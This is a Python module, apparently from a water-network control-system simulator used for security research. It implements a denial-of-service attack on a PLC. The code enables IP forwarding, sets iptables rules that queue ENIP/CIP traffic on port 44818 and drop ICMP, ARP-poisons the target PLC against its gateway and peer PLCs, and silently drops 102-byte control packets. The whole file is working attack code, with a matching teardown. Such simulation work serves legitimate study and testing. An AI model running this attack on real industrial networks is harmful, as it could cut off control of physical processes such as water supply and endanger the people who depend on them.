from dhalsim.network_attacks.enip_cip_parser.cip import *
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.all import Ether
from scapy.all import *
import os

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from dhalsim.network_attacks.synced_attack import SyncedAttack
import argparse
from pathlib import Path

enip_port = 44818
sniffed_packet = []

nfqueue = NetfilterQueue()


class SimpleDoSAttack(SyncedAttack):
    """
    This is a simple DoS attack. This attack will launch an ARP spoofing attack and then stop forwarding CIP packets
    to the  the target PLC.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """
    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.thread = None
        self.server = None
        self.run_thread = False
        self.tags = {}
        self.dict_lock = threading.Lock()

    def setup(self):

        os.system( f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        # Launch the ARP poison by sending the required ARP network packets
        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])

        self.logger.info(f"Start ARP Poison between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        nfqueue.bind(0, self.capture)
        nfqueue.run(block=False)

    def capture(self, packet):
        parsed_packet = IP(packet.get_payload())
        if len(parsed_packet) != 102:
            packet.accept()
        else:
            packet.drop()

    def teardown(self):
        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    restore_arp(self.target_plc_ip, plc['local_ip'])

        self.logger.info(f"Stop ARP Poison between  {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} '
                  f'-j NFQUEUE')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        nfqueue.unbind()
        self.logger.debug("[*] Stopping water level spoofing")

    def interrupt(self):
        """
        This function will be called when we want to stop the attacker. It calls the teardown
        function if the attacker is in state 1 (running)
        """
        if self.state == 1:
            self.teardown()

    def attack_step(self):
        """This function just passes, as there is no required action in an attack step."""
        pass


def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = SimpleDoSAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()